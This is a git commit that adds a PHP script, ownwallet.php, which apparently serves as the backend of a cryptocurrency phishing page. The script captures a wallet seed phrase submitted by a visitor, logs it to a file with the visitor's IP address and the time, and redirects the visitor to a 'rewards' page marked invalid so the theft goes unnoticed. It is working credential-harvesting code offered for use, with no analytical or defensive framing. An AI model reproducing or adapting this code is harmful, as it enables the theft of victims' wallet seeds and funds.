1086194a95aa980b0ccf70bc602f117a7fac297d
weownchx <85898072+weownchx@users.noreply.github.com>
2021-06-15 00:55:19 +0700

    Add files via upload

---
+++ ownwallet.php
@@ -0,0 +1,24 @@
+<?php
+$file = "CHX_______2021";
+$walletSeed   = $_POST['seed'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "================================  seed ================================ ");
+fwrite($handle, "\n");
+fwrite($handle, "KEY : ");
+fwrite($handle, "$walletSeed");
+fwrite($handle, "\n");
+
+fwrite($handle, "IP  : ");
+
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Time: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fclose($handle);
+header("Location:https://weownchx.github.io/rewards/invalid.html?access.wallet");
+
+?>
